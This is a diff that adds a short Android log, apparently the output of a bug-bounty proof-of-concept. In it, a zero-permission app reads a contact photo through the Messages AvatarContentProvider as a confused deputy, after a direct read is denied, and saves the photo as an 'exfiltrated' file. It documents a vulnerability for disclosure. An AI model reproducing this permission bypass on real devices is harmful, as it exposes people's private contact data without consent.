@@ -1,0 +1,5 @@
+09-29 20:56:15.201 22589 22589 W MSG_AVATAR_EXFIL: === Messages AvatarContentProvider confused-deputy exfil ===
+09-29 20:56:15.201 22589 22589 W MSG_AVATAR_EXFIL: UID=10401 (ZERO permissions, no READ_CONTACTS)
+09-29 20:56:15.234 22589 22589 W MSG_AVATAR_EXFIL: [EXPECTED DENIAL] direct contacts photo read failed: java.lang.SecurityException: Permission Denial: reading com.android.providers.contacts.ContactsProvider2 uri content://com.android.contacts/contacts/2/photo from pid=22589, uid=10401 requires android.permission.GLOBAL_SEARCH, or grantUriPermission()
+09-29 20:56:15.299 22589 22589 W MSG_AVATAR_EXFIL: [LEAKED] avatar bytes via confused deputy: 5100 bytes
+09-29 20:56:15.319 22589 22589 W MSG_AVATAR_EXFIL: [SAVED] /storage/emulated/0/Android/data/com.vrp.zeroperm/files/exfiltrated_contact_photo.png
